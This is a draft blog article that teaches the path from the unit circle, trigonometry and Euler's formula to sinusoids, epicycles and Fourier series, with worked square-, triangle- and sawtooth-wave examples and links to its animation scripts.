        <p>This article will be part of a more extended series in which I plan to explore various aspects of <a href="https://en.wikipedia.org/wiki/Fourier_analysis">Fourier Mathematics</a>. I will take notes, create some visuals (a good pretext to learn more about graphics), and hope that it will be useful to someone other than me.</p>

<p>The article has yet to be thoroughly reviewed by anyone other than me, so I put it online, hoping to get some feedback before bringing it to a final state.</p>

<h2 id="table-of-contents">Table of contents</h2>

<p>In this series, we will start with a brief recap of some of the math concepts related to the circle, including trigonometric functions like sine and cosine. We’ll also discuss Euler’s identity, introduce the concept of a sinusoid (and complex sinusoid), and finally, we’ll introduce the concept of Fourier Series.</p>

<p>The animations used in this series are original, although I drew inspiration from some existing materials found on the web. Please keep in mind that this is not a comprehensive course on the topic, so if you’re really interested in learning more, I recommend taking a full course on the subject.</p>

<h2 id="the-circle">The Circle</h2>

<p>It all starts with <a href="https://en.wikipedia.org/wiki/Circle"><em>The Circle</em></a>:</p>



<p>The Circle is a geometrical figure with a center \(P(a, b)\), and a radius \(r\).</p>

<p>It has the following associated equation:</p>

\[(x-a)^{2} + (y-b)^{2} = r^2\]

<p>If \(a=0, b=0\) and \(r=1\), the circle becomes less generic, so we call it <a href="https://en.wikipedia.org/wiki/Unit_circle"><em>The Unit Circle</em></a>:</p>



<p>The equation for <em>The Unit Circle</em> is:</p>

\[x^2+y^2=1\]

<p>One could argue <em>The Circle</em> is the epitome of <a href="https://en.wikipedia.org/wiki/Symmetry">symmetry</a>.</p>

<p>Pick one point, \(A\), then its reflection <em>on the other side</em>, \(A^{'}\), and start rotating:</p>



<p>What happens on <em>The Circle</em>, stays on <em>The Circle</em>.</p>

<h2 id="the-number-pi">The number \(\pi\)</h2>

<p>We rarely see angles expressed in <a href="https://en.wikipedia.org/wiki/Degree_(angle)">degrees</a>; usually, we represent them in relation to the number <a href="https://www.andreinc.net/2024/04/24/(https://en.wikipedia.org/wiki/Pi)">PI</a> \(\pi\): \(\pi\), \(\frac{\pi}{2}\), \(\frac{\pi}{3}\), \(\frac{\pi}{4}\), etc.;</p>

<p>\(\pi\) is the ratio of a circle’s circumference to its diameter. <code>π ≈ 3.14</code>.</p>



<p>If \(r \neq 1\), the circle’s perimeter is \(P=2\pi r\), while the area is \(A=\pi r^2\). Both \(A\) and \(P\) depend on \(\pi\).</p>

<p>\(\pi\) is <a href="https://en.wikipedia.org/wiki/Irrational_number">irrational</a> and <a href="https://en.wikipedia.org/wiki/Transcendental_number">transcendental</a>.</p>

<h2 id="radians">Radians</h2>

<p>The <a href="https://en.wikipedia.org/wiki/Radian"><code>radian</code></a> (or <code>rad</code>) is the <em>actual</em> unit we use to measure angles. An intimate relationship exists between the <code>radian</code> and the number \(\pi\).</p>



<p>To transform an angle measured in degrees (\(360°\)) to radians, the algorithm is simple: we multiply the angle by \(\pi\), then divide the result by \(180\).</p>

<h2 id="the-sine-and-the-cosine">The sine and the cosine</h2>

<p>We can define \(\sin\) and \(\cos\) in relationship to <em>The Unit Circle</em>:</p>



<ul>
  <li>\(\theta\) is the angle formed by the radius, \(r\) and the \(x\) axis, at every given point.</li>
  <li>The \(\sin\) function represents the \(y\)-coordinate of a point on the <em>Unit Circle</em>;</li>
  <li>The \(\cos\) function is the \(x\)-coordinate of the same point on the <em>Unit Circle</em>.</li>
</ul>

<p>\(\sin\) and \(\cos\) are <a href="https://en.wikipedia.org/wiki/Periodic_function"><em>periodic functions</em></a> with the period \(2\pi\).</p>



<p>At this point, it will be unfair for \(\cos\) not to plot it on the same graph:</p>



<h2 id="the-cos-leads-the-sin">The \(\cos\) leads the \(\sin\)</h2>

<p>Putting \(\cos\) and \(\sin\) side by side, we observe that they are not that different:</p>

\[\sin(x+\frac{\pi}{2})=\cos(x)\]

<p>We say that \(\cos\) leads the \(\sin\) with \(\frac{\pi}{2}\):</p>



<h2 id="the-parity-of-cos-and-sin">The parity of \(\cos\) and \(\sin\)</h2>

<p>The <a href="https://en.wikipedia.org/wiki/Even_and_odd_functions"><em>parity</em> of mathematical functions</a> generally refers to whether a function is <em>even</em>, <em>odd</em>, or <em>neither</em>.</p>

<p>The <em>cosine</em> is <em>even</em>, meaning \(\cos(x)=\cos(-x)\):</p>



<p>And the <em>sine</em> is odd, meaning \(\sin(-x)=-\sin(x)\), or \(\sin(x)=-\sin(-x)\):</p>



<h2 id="complex-numbers-and-the-unit-circle">Complex Numbers and the Unit Circle</h2>

<p>In the <a href="https://en.wikipedia.org/wiki/Complex_plane">Complex Plane</a>, the points on the circle are defined by the following equation:</p>

\[z=\cos(\theta)+i*\sin(\theta)\]



<h2 id="multiplying-with-i-means-a-rotation-with-fracpi2">Multiplying with \(i\) means a rotation with \(\frac{\pi}{2}\)</h2>

<p>Multiplying a <em>complex number</em> with <a href="https://en.wikipedia.org/wiki/Imaginary_unit">imaginary unit</a> \(i\) is the equivalent of rotating the number counterclockwise with \(\frac{\pi}{2}\) on an “imaginary circle” with the radius: \(r=\mid a + b*i \mid=\sqrt{a^2 + b^2}\)</p>

<p>For example, if we take \(z_{1} \in \mathbb{C}\) and we multiply it three times with \(i\) we will have it <em>rotated</em> into the all 4 quadrants of the circle:</p>



<h2 id="eulers-identity">Euler’s identity</h2>

<p>The natural exponential function, often denoted as \(f(x)=e^{x}\), is a particular case of the exponential function where the base is \(e\), also known as <em>Euler’s Number</em> (\(e \approx 2.71828\)).</p>

<p>\(e\), just like \(\pi\), <a href="https://en.wikipedia.org/wiki/Irrational_number">irrational</a> and <a href="https://en.wikipedia.org/wiki/Transcendental_number">transcendental</a>.</p>

<p>We normally define \(e\) as:</p>

\[e=\sum_{n=0}^{\infty}(\frac{1}{n!})=\frac{1}{0!} + \frac{1}{1!}+\frac{1}{2!}+...\]

\[e=\lim_{x \to \infty}(1+\frac{1}{x})^x\]

\[e=\lim_{x \to 0}(x+1)^{\frac{1}{x}}\]

<p>Even if not obvious, there’s a strong connection between \(e\) and the circle.</p>

<p>The <em>natural exponentiation</em> function is an <a href="https://en.wikipedia.org/wiki/Eigenfunction"><em>eigenfunction</em></a> for <a href="https://en.wikipedia.org/wiki/Derivative">differentiation</a>.</p>

<p>An eigenfunction in this context is a function that, when differentiated, yields a constant multiple of itself:</p>

\[\frac{d}{dx} e^{ax} = a * e^{x}\]

<p>If we substitute \(a \rightarrow e\), by subsequently differentiating \(f(x) = e^{ix}\), we obtain:</p>

\[\frac{d}{dx}f(x) = \frac{d}{dx} (e^{ix}) = i * e^{ix}\]

\[\frac{d^2}{dx^2}f(x) = \frac{d^2}{dx^2} (e^{ix}) = \frac{d}{dx} (i * e^{ix}) = -e^{ix}\]

\[\frac{d^3}{dx^3}f(x) = \frac{d^3}{dx^3} (e^{ix}) = \frac{d}{dx} (-e^{ix}) = -i * e^{ix}\]

\[\frac{d^4}{dx^4}f(x) = \frac{d^4}{dx^4} (e^{ix}) = \frac{d}{dx} (-i*e^{ix}) = e^{ix} = f(x)\]

<p>In simple terms, after we differentiate \(f(x)\) four times (\(f'(x), f''(x), f'''(x), f''''(x)\)), our function does a <em>full circle</em>.</p>

<p>It’s the same pattern described in the previous section when we multiplied our \(z_{1}\) with \(i\).</p>

<p>Subsequently deriving \(e^{ix}\) is the equivalent of subsequently multiplying \(e^{ix}\) with \(i\). Multiplying a complex number with \(i\) means <em>rotating</em> that number in the <em>Complex Plane</em> with \(\frac{\pi}{2}\).</p>

<p>But what is a derivative of a function at a certain point?</p>

<p>It’s the rate of change of that function at that particular point. But we’ve just said that the derivative of \(e^{ix}\) is equivalent to a <em>rotation</em>.</p>

<p>So, the rate of change is rotational.</p>

<p>We can intuitively <em>feel</em> that the function \(e^{ix}\) describes an actual circle.</p>

<p>There’s no other possible solution. So we can boldly affirm that \(e^{ix} = \cos(x) + i*\sin(x)\) (which is the formula discovered by Euler).</p>

<p>Of course, this is not a rigorous demonstration. One can prove Euler’s identity using <a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor Series</a>.</p>

<h2 id="eulers-formula-the-connection-between-e-pi-and-i">Euler’s formula, the connection between \(e\), \(\pi\) and \(i\)</h2>

<p>Euler’s formula is a thing of marvel:</p>

\[e^{ix}=\cos(x) + i * \sin(x)\]

<p>Or, if we choose \(x=\pi\):</p>

\[e^{i\pi}+1=0\]

<h2 id="the-sin-and-cos-in-their-exponential-form">The \(\sin\) and \(\cos\) in their exponential form</h2>

<p>By substituting \(x \rightarrow -x\) into Euler’s identity we obtain:</p>

\[e^{-ix}=\cos(x)-i*\sin(x)\]

<p>If we add/subtract the two equalities, we will obtain the definition of the sine and cosine functions in their exponential form:</p>

\[\cos(x) = \frac{e^{ix} + e^{-ix}}{2}\]

\[\sin(x) = \frac{e^{ix} - e^{-ix}}{2*i}\]

<p>All points of the circle are determined by a functon \(z(x)\), where:</p>

\[z(x)=e^{ix}=\underbrace{\cos(x)}_{Re(x)}+\underbrace{i*\sin(x)}_{Im(x)}\]

<p>\(x\) represents the actual angle \(\theta \in \mathbb{R}\), so \(z(\theta)=e^{i\theta}=cos(\theta)+i*sin(\theta)\).</p>

<p>You’ve seen that we’ve interchanged \(x\) with \(t\) and \(\theta\) throughout the article. It’s confusing, but don’t get confused. We are the ones to decide how to look at \(x\), as an angle or as time.</p>

<h2 id="the-sinusoid">The sinusoid</h2>

<p>A <em>sinusoid</em>, or a <em>sine wave</em>, is a smooth, repetitive curve defined by following function:</p>

\[y(t) = A * \sin(2\pi ft + \varphi) = A * \sin(\omega t + \varphi)\]

<ul>
  <li>\(A\) is called the <em>amplitude</em>, representing the maximum deviation of the function from zero.</li>
  <li>\(f\) is called <em>ordinary frequency</em> and denotes the number of oscillations (the radius moving inside the circle) occurring each second.</li>
  <li>\(\omega=2\pi f\) is called the <em>angular frequency</em>; it’s the same thing as <em>ordinary frequency</em>, but we measure it \(\frac{radians}{second}\);</li>
  <li>\(\varphi\) is called <em>phase offset</em>; it’s measured in radians.</li>
</ul>

<p>If we consider <em>time</em> to be the \(x\)-axis, and \(y(t)\) the \(y\)-axis, the sinusoid becomes:</p>

\[y=f(x)=A * \sin(\omega x + \varphi)\]

<p>The \(\sin\) and \(\cos\) are just particular cases of sinusoids.</p>

<h2 id="sinusoids-are-flexible">Sinusoids are <em>flexible</em></h2>

<p>The following animation is interactive. You can choose the values of \(A=\) 
    
    , \(\omega=\)
         
    and \(\varphi=\) 
     
    to plot the sinusoid (if you pick \(\varphi=\frac{\pi}{2}\) a cosine is plotted):</p>



<h2 id="sinusoids-can-be-complex">Sinusoids can be complex</h2>

<p>Starting with the definition of a sinusoid:</p>

\[y(t) = A * sin(2\pi ft + \varphi) = A * sin(\omega t + \varphi)\]

<p>If we multiply each side with \(A\):</p>

\[A*e^{i\theta}=A*(\cos(\theta)+i*\sin(\theta))\]

<p>If we substitute \(\theta\) with \(\theta=\omega t + \varphi\) we obtain the complex sinusoid:</p>

\[s(t)=A*e^{i(\omega t + \varphi)} = A * \cos(\underbrace{\omega t + \varphi}_{\theta}) + i * A * \sin(\underbrace{\omega t + \varphi}_{\theta})\]

<p>A <em>complex sinusoid</em> captures the behavior of two sinusoids (one cosine and one sine) on both its axes; on the real part, it behaves like a cosine, while on its imaginary part, it behaves like a sine.</p>

<p>The two are <em>in sync</em> as they both depend on the free variable \(\theta\), expressed as \(\theta=\omega t + \varphi\).</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/threedcomplex.js">(Source code)</a></sup></sup></p>

<p>Two interesting observations:</p>
<ul>
  <li>If we project the complex sinusoid on the plane determined by the Y-axis and Z-axis, we will plot a <em>sine</em> (the Imaginary part);</li>
  <li>If we project the complex sinusoid on the plane determined by the X-axis and Z-axis, we will plot a <em>cosine</em> (the Real part);</li>
</ul>

<h2 id="sinusoids-can-nullify-themselves">Sinusoids can nullify themselves</h2>

<p>Two sinusoids in phase and sharing the same amplitude but with opposite frequencies nullify themselves.</p>



<h2 id="adding-sinusoids-leads-to-complexity">Adding sinusoids leads to complexity</h2>

<p>Let’s plot two arbitrary selected sinusoids \(y_{1}(x)\) and \(y_{2}(x)\), where:</p>
<ul>
  <li>\(y_{1}(x) = \frac{9}{10} * sin(7x + \frac{\pi}{2})\), and</li>
  <li>\(y_{2}(x) = \frac{12}{10} * sin(3x - 2)\) .</li>
</ul>

<p>The sum \(y(x)=y_{1}(x) + y_{2}(x)\) shows an interesting pattern</p>



<h2 id="adding-random-sinusoids-for-fun">Adding random sinusoids for fun</h2>

<p>Adding more sinusoids to an existing one (\(A=1\), \(\omega=1\), \(\varphi=1\)) generate more complex patterns:</p>



<h2 id="playing-sinusoidal-tetris-for-fun">Playing Sinusoidal tetris for fun</h2>

<p>Not so long ago, <a href="https://www.andreinc.net/2024/02/06/the-sinusoidal-tetris">I’ve re-imagined the game of Tetris</a>.</p>

<p>It’s now possible to play Tetris with Sinusoids:</p>

<p><a href="https://www.andreinc.net/2024/02/06/the-sinusoidal-tetris"><img src="https://www.andreinc.net/assets/images/2024-04-08-from-the-circle-to-epicycles/sinusoida-tetris.png" alt="img"></a></p>

<h2 id="a-square-wave-and-sinusoids">A square wave and sinusoids</h2>

<p>If we carefully choose the sinusoids, we can create <em>predictable</em> patterns:</p>

<p>Let’s take, for example, use the following formula:</p>

\[y(x) = \frac{4}{\pi}\sum_{k=1}^{\infty}\frac{\sin(2\pi(2k-1)fx)}{2k-1}\]

<p>Through expansion, the formula becomes:</p>

\[y(x) =  \underbrace{\frac{4}{\pi}\sin(\omega x)}_{y_{1}(x)} + \underbrace{\frac{4}{3\pi}\sin(3\omega x)}_{y_{2}(x)} + ... + \underbrace{\frac{4}{(2k-1)\pi}{\sin((2k-1)\omega x)}}_{y_k(x)} + ...\]

<p>\(y_1(x), y_2(x), y_3(x), ..., y_k(x), ...\) are all the individual sinusoids.</p>

<p>If we perform the sum, we will create a <em>square wave</em>. The more sinusoids we pick, the better the approximation.</p>

<p>Please choose how many sinusoids you want to use, and let’s see how the functions look like for  (and \(\omega\)=):</p>



<h2 id="epicycles---first-encounter">Epicycles - First Encounter</h2>

<p>One sinusoid has a corresponding circle that <em>spins</em>. So, the above animation can be re-imagined like this:</p>

<p>Pick  and \(\omega\)= to plot the circles and the corresponding \(y_k(x)\) functions:</p>



<h2 id="epicycles---an-intuitive-understanding">Epicycles - An intuitive understanding</h2>

<p>There’s an intuitive proof to this: each epicycle corresponds to a specific sinusoid; when we talk about combining the sinusoids, we are talking about summing their positions at each point in time, and eventually, this operation reduces to subsequent vector additions.</p>

<p>Let’s take a simple example by introducing three arbitrarily picked sinusoids and their associated <em>point vectors</em> (or <em>position vectors</em>):</p>
<ul>
  <li>\(y_{1}(x)=1.4sin(x + 1)\), with the associated position vector \(\vec{u_{1}}\);</li>
  <li>\(y_{2}(x)=0.8sin(2*x)\), with the associated position vector \(\vec{u_{2}}\);</li>
  <li>\(y_{3}(x)=0.5sin(3*x)\), with the associated position vector \(\vec{u_{3}}\).</li>
</ul>

<p>Their sum is \(y(x) = y_{1}(x) + y_{2}(x) + y_{3}(x) = 1.4sin(x + 1) + =0.8sin(2*x) + 0.5sin(3*x)\).</p>

<p>A position vector represents the displacement from the origin \((0, 0)\) to a specific point in space. In our case, the vector \((x, y_{k}(x))\) represents the position or location of a point on the graph of the function(s) \(y_{k}(x)\) at a particular \(x\) value.</p>

<p>If we plot \(y(x)\) on the cartesian grid we obtain something like:</p>



<p>At each given point \(x\), we can say for certain that \(\vec{u} = \vec{u_{1}} + \vec{u_{2}} + \vec{u_{3}}\).</p>

<h2 id="epicycles---a-flower">Epicycles - A flower</h2>

<p>If we carefully pick the <em>right sinusoids</em> the moving circles can describe (approximate) any shape we want.</p>

<p>Here is a flower for example:</p>



<p>Can you guess the individual sinusoids working together to draw the flower?</p>

<p>You probably can’t unless you apply methods from a branch of mathematics called <em>Fourier Analysis</em>.</p>

<h2 id="fourier-series">Fourier Series</h2>

<p><em>Fourier Series</em> is the mathematical process through which we expand a periodic function of period \(P\) as a sum of trigonometric functions.</p>

<p>Do you remember the <a href="https://en.wikipedia.org/wiki/Pink_Floyd">Pink Floyd’s</a> album cover for the <a href="https://en.wikipedia.org/wiki/The_Dark_Side_of_the_Moon"><em>Dark Side of The Moon</em></a>:</p>

<p><img src="https://www.andreinc.net/assets/images/2023-07-02-painting-with-circles/darksideofthemoon.jpg" alt="img"></p>

<p>Imagine our function \(f(x)\) is the light itself, <a href="https://en.wikipedia.org/wiki/Prism_(optics)">the prism</a> is essentially <em>Fourier Mathematics</em>, and the spectral colors emanating from the prism are the sinusoids.</p>

<p>Following the analogy the formula looks like this:</p>

\[\underbrace{f(x)}_{\text{ light itself}}=\underbrace{A_{0} + \sum_{n=1}^{\infty} [A_{n} cos(\frac{2\pi nx}{P}) + B_{n} sin(\frac{2\pi nx}{P})]}_{\text{the spectral components}}\]

<p>Where \(A_{n}\) and \(B_{n}\) are called <em>Fourier Coefficients</em> are defined by the following integrals:</p>

\[A_{0} = \frac{1}{P} \int_{- \frac{P}{2}}^{+\frac{P}{2}} f(x) dx\]

\[A_{n} = \frac{2}{P} \int_{- \frac{P}{2}}^{+ \frac{P}{2}} f(x) * \cos(\frac{2\pi nx}{P}) dx\]

\[B_{n} = \frac{2}{P} \int_{- \frac{P}{2}}^{+ \frac{P}{2}} f(x) * \sin(\frac{2\pi nx}{P}) dx\]

<h2 id="fourier-series-in-exponential-form">Fourier Series in Exponential Form</h2>

<p>With the help of Euler’s Formula and by changing the sine and cosine functions in their exponential forms, we can also express the Fourier Series of a function as a sum of <em>Complex Sinusoids</em>:</p>

\[f(x) = \sum_{n=-N}^{N} C_{n} e ^ {i2\pi \frac{n}{P}x}\]

<p>Where:</p>

\[C_{n} = \begin{cases}
            A_{0} &amp; \text{if } n = 0 \\
            \frac{1}{2} (A_{n} - i * B_{n}) &amp;  \text{if } n &gt; 0 \\
            \frac{1}{2} (A_{n} + i * B_{n}) &amp; \text{if } n &lt; 0 \\
        \end{cases}\]

<p>If we do additional substitutions, the final form of \(C_{n}\) is:</p>

\[C_{n} = \frac{1}{P} \int_{-\frac{P}{2}}^{\frac{P}{2}} e^{-i2\pi\frac{n}{P}x} f(x) dx\]

<h2 id="example-the-fourier-series-for-the-box-function">Example: The Fourier Series for the Box Function</h2>

<p>Remember the <em>Square Wave</em> we’ve approximated with sinusoids <a href="#adding-sinusoids">in this section</a>? At that point, we used the following formula to express the <em>Square</em> as a sum of sinusoidal components:</p>

\[y(x) = \frac{4}{\pi}\sum_{k=1}^{\infty}\frac{\sin(2\pi(2k-1)fx)}{2k-1}\]

<p>Or, to keep things simpler, by substituting \(\omega=2\pi f\) (\(\omega\) is the angular frequency):</p>

\[y(x) = \frac{4}{\pi}\sum_{k=1}^{\infty}\frac{\sin((2k-1)\omega x)}{2k-1}\]

<p>It’s time to understand how we’ve devised such an approximation.</p>

<p>In <em>isolation</em>, the <em>Square Wave</em>, \(f(x)\) looks like this:</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/squarewavef.js">(Source code)</a></sup></sup></p>

<p>Throughout the interval  <code>[0, 2L]</code>, \(f(x)\) can be written as:</p>

\[f(x) = 2 [H(\frac{x}{L})-H(\frac{x}{L}-1)] - 1\]

<p>Where \(H(x)\) is called the <a href="https://mathworld.wolfram.com/HeavisideStepFunction.html"><em>Heavisde Step Function</em></a> and has the following definition:</p>

\[H(x) =  \begin{cases}
        0 &amp; \text{if } x \lt 0 \\
        1 &amp; \text{if } x \ge 0 \\
        \end{cases}\]

<p>First of all, let’s look at \(A_{0} = \frac{1}{2L} \int_{0}^{2L} f(x) dx\). Notice how we’ve changed the interval from \([-\frac{P}{2}, \frac{P}{2}]\) to \([0, 2L]\) to match our example. This will be reflected in the formulas.</p>

<p>Well, this coefficient (\(A_{0}\)) is a fancy way to express the average of \(f(x)\) over the interval (in our case <code>[0, 2L]</code>). In the same time \(A_{0}\) is the area determined by \(f(x)\) over <code>[0, 2L]</code> then divided by \(2L\). But if you look at the plot again, you will see that the net area is  \(0\), because the green area (S1) nullifies the red area (S2), regardless of \(L\).</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/squarewavefa0.js">(Source code)</a></sup></sup></p>

<p>Secondly, let’s compute the \(A_{n} = \frac{1}{L} \int_{0}^{2L} f(x) * \cos(\frac{\pi nx}{L}) dx\) coefficients. An important observation is that \(f(n)\) is odd, and its average value on the interval is \(0\); we can safely say all the coefficients \(A_{n}\) also vanish.</p>

<p>Visually speaking, regardless of how you pick \(n\) or \(L\), the net area determined by the \(A_{n}\) integral will always be zero. It’s visually obvious if we <em>plot</em> \(A_n\). For example plotting \(A_{1}\), \(A_{2}\), \(A_{3}\), \(A_{4}\) looks like this:</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/squarewavean.js">(Source code)</a></sup></sup></p>

<p>Similar symmetrical patterns will emerge if you increase the \(n\) in \(A_{n}\) and plot them.</p>

<p>Thirdly, we need to compute:</p>

\[B_{n} = \frac{1}{L} \int_{0}^{2L} f(x) * \sin(\frac{\pi nx}{L}) dx\]

<p>If we plot a \(B_{1}\), \(B_{2}\), \(B_{3}\) and, let’s say, \(B_{4}\) we can intuitively <em>feel</em> what’s happening with \(B_{n}\):</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/squarewavebn.js">(Source code)</a></sup></sup></p>

<p>If you have a keen eye for geometrical representations, you will notice that every even \(B_{n}\) is also 0. The red and green areas nullify, so the net area described by the integral is \(0\). The odd terms will be \(2 * \text{something}\), so let’s calculate that \(\text{something}\).</p>

<p>We will need to split the integral on two sub-intervals \([0, L]\) and \([L, 2L]\) (there’s a <em>chasm</em> at \(L\)), but given the fact \(f(x)\) and \(sin(x)\) are odd, \(B_{n}\) can we written as:</p>

\[B_{n} = 2 * [\frac{1}{L} \int_{0}^{L} f(x) * \sin(\frac{\pi nx}{L}) dx]\]

<p>We can now perform <a href="https://en.wikipedia.org/wiki/Integration_by_substitution">u-substition</a>, so we can write:</p>

\[B_{n} = \frac{2}{L} \int_{0}^{nL\pi} \frac{\sin(\frac{u}{L})}{n\pi}du\]

<p>After we take the constant out, we compute the integral, use the intervals, and take into consideration the periodicity of cosine:</p>

\[B_{n} = \frac{2}{n\pi}(1-(-1)^n)\]

<p>And now we see it, \(B_{n}\) is exactly \(0\) if \(n\) is even, and \(B_{n}=2 * \frac{2}{n\pi}\) is \(n\) is odd.</p>

<p>Putting all back into the master formula of the <em>Fourier Series</em>:</p>

\[f(x)=\underbrace{A_{0}}_{0} + \sum_{n=1}^{\infty} [\underbrace{A_{n} \cos(\frac{\pi nx}{L})}_{0} + B_{n} \sin(\frac{\pi nx}{L})]\]

<p>Things become:</p>

\[f(x)=\frac{4}{\pi} \sum_{n=1,3,5...}^{+\infty} (\frac{1}{n} * \sin(\frac{\pi nx}{L}))\]

<p>If we substitute \(n \rightarrow 2k-1\) and consider, we obtain the initial formula:</p>

\[f(x)=\frac{4}{\pi} \sum_{k=1}^{+\infty} (\frac{\sin(\frac{\pi (2k-1)x}{L})}{(2k-1)})\]

<p>To obtain the initial formula, we substitute \(L \rightarrow \frac{1}{2f}\), and \(2\pi f \rightarrow \omega\), basically we create an interdependence between \(L\) (half of the interval) and \(\omega\), \(L=\frac{\pi}{\omega}\):</p>

\[f(x) = \frac{4}{\pi}\sum_{k=1}^{\infty}\frac{\sin((2k-1)\omega x)}{2k-1}\]

<p>Unfortunately, there’s no way we can go to \(+\infty\), so let’s consider \(s(x)\) as an approximation of \(f(x)\) that depends on \(n\).</p>

\[s(x) = \frac{4}{\pi}\sum_{k=1}^{n}\frac{\sin((2k-1)\omega x)}{2k-1} \approx f(x)\]

<p>In the next animation, you will see that by increasing \(n\), the accuracy of our approximation gets better and better, and the <em>gaps</em> are slowly closed:</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/tightfourier.js">(Source code)</a></sup></sup></p>

<p>To understand how adding more coefficients improves the approximation, let’s look back again at a few of our coefficients \(s_{1}(x)\), \(s_{2}(x)\), \(s_{3}(x)\), \(s_{4}(x)\) and \(s_{5}(x)\) (we will pick \(\omega=\frac{\pi}{2}\), so that \(2L=1\)):</p>

\[s_{1}(x) = \frac{4}{\pi} \sin(\frac{\pi x}{2})\]

\[s_{2}(x) = \frac{4}{3\pi} \sin(\frac{3\pi x}{2})\]

\[s_{3}(x) = \frac{4}{5\pi} \sin(\frac{5\pi x}{2})\]

\[s_{4}(x) = \frac{4}{7\pi} \sin(\frac{7\pi x}{2})\]

\[s_{5}(x) = \frac{4}{9\pi} \sin(\frac{9\pi x}{2})\]

<p>Each of the 5 terms is a sinusoid, with \(\frac{4}{\pi}\), \(\frac{4}{3\pi}\), etc. amplitudes, and \(\frac{\pi}{2}\), \(\frac{3\pi}{2}\), etc. frequencies.</p>

<p>So, if we were to approximate a <em>Square Wave</em> with its fifth partial sum (the red dot), we would obtain something like this:</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/tightfourieravg.js">(Source code)</a></sup></sup></p>

<p>Notice how <em>obsessed</em> the <em>red dot</em> is with the <em>blue dot</em> (the actual function) and how closely it follows it.</p>

<p>We can always add more terms to the partial sum to help the <em>red dot</em> in its <em>holy mission</em>, improving the approximation until nobody cares anymore.</p>

<h2 id="example---the-fourier-series-of-the-triangle-wave">Example - The Fourier Series of the Triangle wave</h2>

<p>Without dealing with all the associated math, the <em>Fourier Series</em> decomposition for a triangle-wave is:</p>

\[s(x)=\frac{8}{\pi^2}\sum_{k=1}^{N}\frac{(-1)^{k-1}}{(2k-1)^2}*\sin((2k-1)x)\]

<p>Plotting the function \(s(x)\), we will see that things converge smoothly and fast. As soon as \(n\) approaches \(6\), we can already observe the triangle:</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/tighttriangle.js">(Source code)</a></sup></sup></p>

<p>Let’s compute the first terms six terms of the \(\sum\), so that:</p>

\[s(x) \approx s_1(x) + s_2(x) + s_3(x) + s_4(x) + s_5(x) + s_6(x)\]

<p>Where:</p>
<ul>
  <li>The first term is \(s_1(x)=\frac{8}{\pi^2}*\sin(x)\), where \(A=\frac{8}{\pi^2}\), \(\omega=1\), \(\varphi=0\);</li>
  <li>The second term is \(s_2(x)=-\frac{8}{3^2\pi^2}*\sin(3x)\), where \(A=-\frac{8}{3^2\pi^2}\), \(\omega=3\), \(\varphi=0\);</li>
  <li>The third term is \(s_3(x)=\frac{8}{5^2\pi^2}*\sin(5x)\), where \(A=\frac{8}{5^2\pi^2}\), \(\omega=5\), \(\varphi=0\);</li>
  <li>The fourth term is \(s_4(x)=-\frac{8}{7^2\pi^2}*\sin(7x)\), where \(A=-\frac{8}{7^2\pi^2}\), \(\omega=7\), \(\varphi=0\);</li>
  <li>The fifth term is \(s_5(x)=\frac{8}{9^2\pi^2}*\sin(9x)\), where \(A=\frac{8}{9^2\pi^2}\), \(\omega=9\), \(\varphi=0\);</li>
  <li>The sixth term is \(s_6(x)=-\frac{8}{11^2\pi^2}*\sin(11x)\), where \(A=-\frac{8}{11^2\pi^2}\), \(\omega=11\), \(\varphi=0\);</li>
</ul>

<p>A keen eye will see will observe the that \(s_2(x)\), \(s_4(x)\), \(s_6(x)\) and all the even terms are <em>negative</em>.</p>

<p>A negative amplitude doesn’t make too much sense, at least not in a physical sense. What are we going to do with the <em>minus sign</em>?</p>

<p>We have two options:</p>
<ol>
  <li>Because \(\sin(-x)=-\sin(x)\), nobody stops us to make the <em>frequency</em> negative. For example, \(s_2(x)=\frac{8}{3^2\pi^2}*\sin(-3x)\), so that the \(\omega=-3\). But again, why would we want a <em>negative frequency</em>? This also doesn’t make sense in a physical sense.</li>
  <li>We can use \(\vert A \vert\) and shift the signal with \(\pi\), so that \(\varphi=\pi\).</li>
</ol>

<p>In practice, we will go with 2. as it’s more practical and gives us more control, but the two options are equivalent so that we can write \(s_2(x)\) in both ways:</p>

\[s_2(x)=-\frac{8}{3^2\pi^2}*\sin(3x)\]

\[s_2(x)=\frac{8}{3^2\pi^2}*\sin(3x + \pi)\]

<p>Visually speaking, the results will not be surprising if we plot \(sin(-x)\) and \(sin(x+\pi)\) side by side; the two are equivalent:</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/pishift.js">(Source code)</a></sup></sup></p>

<p>If we consider this, the even terms of \(s(x)\) will become:</p>

<ul>
  <li>\(s_2(x)=\frac{8}{3^2\pi^2}*sin(3x+\pi)\) ;</li>
  <li>\(s_4(x)=\frac{8}{7^2\pi^2}*sin(7x+\pi)\) ;</li>
  <li>\(s_6(x)=\frac{8}{11^2\pi^2}*sin(11x+\pi)\) ;</li>
  <li>…and so on</li>
</ul>

<h2 id="example---the-fourier-series-of-a-sawtooth-function">Example - The Fourier Series of a Sawtooth Function</h2>

<p>Shamelessly skipping the math demonstration, a reverse-sawtooth function has the following form:</p>

\[s(x)=\frac{2}{\pi}\sum_{k=1}^{N}(-1)^k*\frac{\sin(kx)}{k}\]

<p>Plotting \(s(x)\), while increasing \(n\), things look like this:</p>

<h2 id="the-fourier-series-machinery">The Fourier Series Machinery</h2>

<p>To better visualize what’s happening, let’s look at a <em>Fourier Series Machinery</em> and how the <em>circles move</em> to create <em><del>beautiful</del> practical patterns</em>.</p>

<p>You can pick the shape of the desired signal from here:  and the sketch will change accordingly.</p>


<p><sup><sup><a href="https://assets/js/2024-04-24-from-the-circle-to-epicycles/fmachinery.js">(Source code)</a></sup></sup></p>

<p>…A bunch of spinning circles on a stick, where each circle corresponds to exactly one term of the series - this is the marvelous <em>Fourier Series Machinery</em>.</p>

<p><img src="https://www.andreinc.net/assets/images/2023-07-02-painting-with-circles/fmachinery.jpg" alt="img"></p>

